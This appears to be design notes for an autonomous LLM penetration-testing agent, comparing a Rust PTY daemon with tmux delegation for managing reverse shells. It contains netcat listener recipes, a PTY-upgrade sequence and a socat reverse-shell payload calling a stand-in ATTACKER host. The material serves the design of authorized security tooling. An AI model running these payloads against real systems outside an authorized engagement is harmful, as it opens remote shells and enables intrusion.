# Interactive Shell, PTY, and Reverse Shell Persistence Design Notes

> **Conclusion (2026-09-05):** This exploration converged into **[ADR-0003](../adr/ADR-0003-shell-execution-and-interactive-primitives.md)** (Status: Accepted). The adopted model is a generic `tmux` passthrough tool — reusing the single-shot execution path of the existing `bash` tool by executing `tmux <args>`, letting tmux fully manage PTY allocation, session state, and process lifecycles. Alternatives such as extending `shell.stdin`, runtime-managed public desks, and session-owning worker RPC relays were formally rejected. Normative decisions and implementation records reside in `docs/adr/ADR-0003-*.md`. The text below preserves the design exploration and comparative analysis that led to this decision.

---

## Comparative Analysis: `pentesting` PTY Daemon vs. `minimal-agent` tmux Delegation

### Structural Limitations Encountered in `pentesting`'s Shell Listener

The sister project `pentesting` addressed the absence of PTYs in reverse shells and dumb shells by **building a dedicated in-core PTY daemon in Rust**. It allocated PTY master/slave pairs via `openpty` + `fork` + `dup2`, accepted agent commands over a Unix Domain Socket (UDS) JSON-RPC server, and parsed boundary sentinels and prompt heuristics to detect command completion. While functional, long-term operation revealed severe structural liabilities:

1. **Excessive Core Complexity:**
   The in-core PTY daemon, UDS JSON-RPC server, 4-worker thread pool, 25 discrete `ControlOp` variants, FD budget system, adaptive upgrade state machine, sentinel parser, prompt detector, and ANSI sanitizer totaled **~7,000 lines of unsafe Rust code**. Embedding this subsystem directly into the core binary meant that even unrelated runtime changes had to account for its side effects.
2. **Fragility of Sentinel Parsing in Production:**
   To determine command completion boundaries, `pentesting` wrapped commands in unique UUID sentinels (`echo "__START_UUID__"; cmd; echo "__END_UUID__"`). An internal parser scanned the output stream for these tokens, while a prompt detector matched shell patterns (`$`, `#`). However, when remote echo-back, subshell environments, or curses interfaces corrupted or fragmented the sentinels, parsing broke down completely. **A parsing failure in the core state machine caused the entire session to block until reaching hard timeouts.**
3. **Fundamental Limits of Software-Compensated `stty raw -echo` Transitions:**
   The root issue in reverse shell upgrades is that the local listener endpoint lacks a PTY. `pentesting` attempted to compensate through complex adaptive automation (sequentially trying 5 upgrade techniques: python3 $\to$ python $\to$ python2 $\to$ script $\to$ expect, followed by probe verification). This **masked the symptom in software rather than eliminating the underlying architectural cause**. When all techniques failed, human manual intervention was still required.
4. **Incomplete Terminal Emulator Reimplementation:**
   Custom ANSI escape parsing in `terminal.rs` handled basic control sequences but failed against full-screen, curses-based applications (`vim`, `top`, `htop`, `gdb`). Partially reimplementing an xterm-compliant terminal emulator within a security agent is inherently brittle and unmaintainable.
5. **Platform Coupling:**
   Reliance on POSIX-specific system calls (`openpty`, `fork`, `setsid`, `TIOCSCTTY`, `dup2`) scattered `#[cfg(unix)]` directives throughout the codebase, making native execution on Windows hosts nearly impossible.
6. **Token Overhead of Large Tool Schemas:**
   Exposing `shell` + `process` (8 operations) + `session_control` (25 operations) meant that **34 complex JSON schema operations were injected into the system prompt every turn**, consuming 3,000–6,000 prompt tokens per step.

---

### Comparison of Mechanisms: How Each Solved the Problem

Both projects solved the same fundamental problem using completely different building blocks: `pentesting` relied on **bespoke Rust systems code**, while `minimal-agent` leveraged **standard OS tooling + prompt tradecraft**.

| Component | `pentesting` | `minimal-agent` |
| :--- | :--- | :--- |
| **PTY Allocation & I/O** | `local_pty.rs` — `openpty` + `fork` + `dup2` (200 lines) | `tmux new-session` (OS calls the exact same syscalls internally) |
| **Session Control IPC** | `control_socket.rs` — UDS + JSON-Lines + 4 workers (760 lines) | `bash -lc "tmux <args>"` — Reuses existing execution path |
| **Terminal Emulation** | `terminal.rs` — Custom ANSI parsing (236 lines, incomplete) | tmux built-in terminal emulator (xterm-compatible, battle-tested) |
| **Dumb Shell Upgrade** | `adaptive_upgrade.rs` — 5-technique state machine (720 lines) | Skill card `07-reverse-shells.md` — Procedural guide for the LLM |
| **Upgrade Verification** | `probe.rs` — Programmatic tty/rows/cols checks (207 lines) | LLM inspects clean `capture-pane` output |
| **Output Boundary Detection**| `sentinel.rs` + `prompt_detect.rs` — UUID sentinels + heuristics | Model turn judgment — LLM checks marker echo or double-capture diff |
| **Session Lifecycle** | `session.rs` + `fd_budget.rs` — State machine + RAII guards (1,500+ lines) | `tmux kill-session` + Tradecraft doctrine: "clean up when finished" |
| **Secret Protection** | `secret_ref` — Stream-level automated redaction | None (plain text in scrollback) |
| **Audit Trail** | Automatic transcript, command ledger, and evidence manifests | Manual logging via `pipe-pane` |
| **Code Footprint** | **~7,000 lines of Rust** (including unsafe syscalls) | **~30 lines of safe Rust + prompt doctrines** |

---

### Capability Coverage: Solved vs. Unsolved Problems

| Problem Domain | `pentesting` | `minimal-agent` | Remarks |
| :--- | :---: | :---: | :--- |
| **PTY Allocation** | ✅ Solved | ✅ Solved | Identical outcome; differs only in execution layer (Rust vs. tmux) |
| **Dumb Shell $\to$ PTY Upgrade** | ✅ Solved | ✅ Solved | `pentesting` automates in code; `minimal-agent` guides via LLM skill card |
| **Eliminating `stty raw -echo`** | ⚠️ Compensated | ✅ Solved | `pentesting` compensates in software; `minimal-agent` eliminates the root cause (tmux pane is already a local PTY) |
| **Full-Screen Terminal Emulation** | ⚠️ Incomplete | ✅ Solved | Custom ANSI parser fails on `vim`/`top`; tmux handles them cleanly |
| **Output Boundary Detection** | ⚠️ Fragile | ⚠️ Fragile | `pentesting` blocks on broken sentinels; `minimal-agent` risks wasted turns if model misjudges. Neither is perfect |
| **Deterministic Upgrade Verification** | ✅ Programmatic | ⚠️ Heuristic | `pentesting` verifies mechanically in code; `minimal-agent` relies on model visual perception |
| **Secret Leak Prevention** | ✅ Solved | ❌ Unsolved | `minimal-agent` preserves plaintext secrets in tmux scrollback |
| **Audit Trail & Evidence Archival** | ✅ Solved | ❌ Unsolved | `minimal-agent` lacks automated framework-level stream recording |
| **FD Exhaustion Prevention** | ✅ Solved | ❌ Unsolved | `minimal-agent` relies on operator/model discipline |
| **Orphaned Session Cleanup** | ✅ Solved | ❌ Unsolved | On agent crash, tmux sessions persist until container teardown |
| **Token Efficiency** | ❌ Inefficient | ✅ Solved | 34-op schema (3,000–6,000 tokens) vs. 2 simple tools (~200 tokens) |
| **Maintenance Burden** | ❌ High | ✅ Low | 7,000 lines of unsafe Rust vs. 30 lines of safe Rust |
| **Environments Lacking tmux** | ✅ Operable | ❌ Inoperable | `minimal-agent` requires tmux installed in the container base image |

**Summary:** `pentesting` **solved policy layers (security, audit, resource management) through massive infrastructure over-engineering**. `minimal-agent` **delegated infrastructure entirely to the OS, achieving extreme architectural simplicity while leaving policy enforcement to LLM tradecraft**.

---

## 1. The Essence of the Problem: Why Dumb Shells Are "Dumb"

Reverse shells received via `nc` lack a **controlling terminal (tty)**. Without a tty:
- Job control is absent (`Ctrl-Z`, `fg`, `bg` fail; `Ctrl-C` kills the entire remote shell).
- Line-buffered echo cannot be negotiated (no arrow keys, no tab completion, no history).
- Utilities like `sudo`, `su`, and `ssh` refuse execution with "must be run from a terminal".
- Curses-based programs (`vim`, `less`, `top`, `gdb`) render corrupted output.
- Command prompts fail to display cleanly.

The traditional manual upgrade procedure attaches a PTY post-connection:

```bash
# 1) Spawn a PTY on the remote target
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 2) Background the shell on the local attack host
Ctrl-Z
# 3) Put local terminal into raw mode and return shell to foreground
stty raw -echo; fg
# 4) Synchronize terminal geometry and type
export TERM=xterm-256color; stty rows 50 cols 200
```

Step 3 (`stty raw -echo`) represents the core barrier: because the local `nc` listener lacks a PTY, the operator must manually flip their own local terminal into raw mode. This sequence assumes a human sitting at a live terminal and is **fundamentally incompatible with discrete LLM tool turns**.

---

## 2. The Core Insight: Running the Listener in a tmux Pane Eliminates `stty raw`

`stty raw -echo` is only needed when the local listener endpoint is a dumb pipe. **If the listener runs inside a tmux pane, the local endpoint is already a genuine PTY.**

Therefore, no local terminal manipulation is needed; the agent only needs to attach the remote PTY:

```bash
# In the agent container: spawn listener inside a tmux pane -> local PTY established
tmux new-session -d -s rev 'stty -echo; nc -lvnp 4444'

# Once connection arrives, send keys to spawn the remote PTY
tmux send-keys -t rev 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"' Enter
tmux send-keys -t rev 'export TERM=xterm-256color; stty rows 50 cols 200' Enter

# Read the screen as clean, decoded plain text
tmux capture-pane -p -t rev
```

The multi-step `Ctrl-Z` $\to$ `stty raw` $\to$ `fg` sequence is **completely eliminated**:
- **Write:** `tmux send-keys` (single discrete tool call)
- **Read:** `tmux capture-pane -p` (single discrete tool call)
- Terminal emulation, raw mode, echo negotiation, and window geometry are **handled entirely by tmux**, completely decoupling the agent runtime core.

---

## 3. Architectural Reframing: "Session = Actor Owned by an Agent"

Because `minimal-agent` features direct inter-agent messaging ([ADR-0001 §6](../adr/ADR-0001-minimal-autonomous-team-agent-core.md)), an interactive session can be modeled as a dedicated actor:

```text
              team send (request)
 worker-A  ───────────────────────▶  worker-shell (Session Owner)
 (Exploit)                             │  tmux new -s tgt ...
 worker-B  ───────────────────────▶  │  send-keys / capture-pane
 (Post-Ex)                             │
              team send (insight)      ▼
 main     ◀───────────────────────  "Shell stabilized: uid=0, TERM=xterm"
```

- **One interactive session = One named tmux session = Owned by one worker.** Ownership guarantees isolation.
- Peer workers request actions via `team send`, or inspect the session directly using `tmux capture-pane`.
- When a shell drops, the owning worker broadcasts an `Insight`, allowing `main` to adjust strategy without blocking its own execution loop.

---

## 4. Concrete Operational Recipes

All recipes execute via standard `tmux` tool invocations without runtime core modifications:

### 4.1 Reverse Shell Listener + Auto-Upgrade + Re-Listen Loop

```bash
# Persistent listener that automatically restarts if connection drops
tmux new-session -d -s rev \
  'while true; do stty -echo; nc -lvnp 4444; echo "[*] dropped, relistening"; sleep 1; done'

# After connection: spawn remote PTY and set terminal geometry
tmux send-keys -t rev \
  'python3 -c "import pty;pty.spawn(\"/bin/bash\")" || script -qc /bin/bash /dev/null' Enter
tmux send-keys -t rev 'export TERM=xterm-256color; stty rows 50 cols 200' Enter

# Inspect output
tmux capture-pane -p -t rev | tail -n 40
```

When `socat` is available on the target, a complete PTY can be established in a single command:

```bash
# Attacker listener inside tmux pane
tmux new -d -s rev 'socat file:$(tty),raw,echo=0 tcp-listen:4444'

# Remote target payload
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444
```

### 4.2 Incremental Output Consumption via `pipe-pane`

Calling `capture-pane` repeatedly dumps the entire screen buffer, wasting context tokens. Use `pipe-pane` to stream incremental changes to disk:

```bash
# Pipe pane output incrementally to a log file
tmux pipe-pane -t rev -o 'cat >> /workspace/loot/rev.log'

# Subsequent turns: read only bytes appended after the previous offset
tail -c +"$LAST_OFFSET" /workspace/loot/rev.log
```

### 4.3 Output Settling Detection (Model-Side Heuristic)

Instead of complex core parsers, the model verifies command completion:
- **Unique Marker:**
  ```bash
  tmux send-keys -t rev 'id; echo "__RDY_$RANDOM__"' Enter
  ```
  The model confirms completion upon seeing the `__RDY_` token in `capture-pane`.
- **Double-Capture Diff:** Inspecting two consecutive captures separated by a short interval; zero delta confirms output has settled.

### 4.4 The Non-Interactive-First Principle

Do not use interactive PTY sessions when non-interactive commands suffice:

```bash
sudo -S id                          # Pass password via stdin pipe
ssh -tt user@host 'id; whoami'      # Force PTY allocation inline
printf 'A\nB\n' | ./vuln            # Batch input via pipe
python3 - <<'PY'                    # Inline script execution
import socket; ...
PY
```

---

## 5. Comparison of Alternatives

| Approach | PTY | State Persistence | Core Changes | Strengths | Weaknesses |
| :--- | :---: | :---: | :---: | :--- | :--- |
| **Single-shot `bash`** | ✗ | None | 0 | Deterministic, isolated | Cannot handle interactive programs |
| **Generic `tmux` (Adopted)** | ✓ | Yes | ~30 lines | Full PTY, captures, incremental reads | Requires tmux in base image |
| **pwntools / pexpect** | ✓ | Script lifetime | 0 | Ideal for complex exploits | Not suited for persistent shells |
| **FIFO Named Pipes** | ✗ | Yes (file) | 0 | Standard POSIX | Not a genuine PTY |
| **dtach / abduco** | ✓ | Yes | 0 | Lightweight | Lacks built-in terminal capture |
| **PTY Daemon + UDS (Rejected)**| ✓ | Yes | 7,000+ lines | Fine-grained programmatic control | High maintenance, sentinel fragility |

**Adopted Hierarchy:** (1) Prefer non-interactive `bash` whenever possible, (2) Use `tmux` for persistent interactive listeners and shells, (3) Use `pwntools`/`pexpect` scripts for complex binary exploit handshakes.

---

## 6. Implementation Status (ADR-0003)

| Exploratory Proposal | Adopted Implementation Status |
| :--- | :--- |
| Add `shell.stdin` optional field | **Rejected.** Cannot represent long-lived REPLs or listeners. |
| Guide tmux recipes via doctrine | **Adopted.** Formal `tmux` tool added to `crates/ma-runtime/src/tools.rs`. |
| Include tmux + socat in base image | **Completed.** Configured in `docker/runtime-base.Dockerfile`. |
| Session-owning worker RPC relay | **Rejected.** 4 KiB message boundaries truncate screen captures. Workers read directly. |
| ADR-0003 Proposed $\to$ Accepted | **Completed.** Formally promoted to Status: Accepted. |

---

## 7. Compliance with Architectural Invariants

- **No Dedicated IPC Daemon (ADR-0003 §4.1):** tmux is an OS process managed via standard process execution; no internal daemon is added to the Rust core.
- **No In-Core Sentinel Parsing (ADR-0003 §4.2):** Boundary markers and diff evaluation are performed in the model turn.
- **No In-Core Terminal Emulator Reimplementation (ADR-0003 §4.3):** Output formatting is delegated to `tmux capture-pane`.
- **No Global Session Collisions (ADR-0003 §4.4):** Named sessions are scoped to individual run namespaces.
- **Minimal Core Footprint (ADR-0001 §3):** Total Rust core modification was ~30 lines of safe passthrough code.
- **Strict Scope Boundaries (ADR-0002 §3.1):** Reverse shell listeners and persistence are strictly confined to authorized engagement scope.

---

## 8. Open Considerations and Operational Safeguards

1. **Scrollback Caps and Full-Screen TUI Apps:** While `capture-pane -p` decodes curses applications reliably, large TUI apps (`nano`, `top`) can trap the agent. Doctrines instruct agents to exit interactive viewers with `q` or `Ctrl-C`.
2. **Concurrency Control:** Concurrent writes to the same tmux session cause input corruption. Systems enforce a strict single-writer-at-a-time rule.
3. **Session Discovery on Restart:** The tmux server runs independently of the runtime. After a crash recovery, the agent rediscovers active sessions via `tmux ls` rather than persisting complex state in the journal.
4. **Orphan Cleanup:** When a run concludes, runtime cleanup routines execute `tmux kill-server` to reclaim system resources.
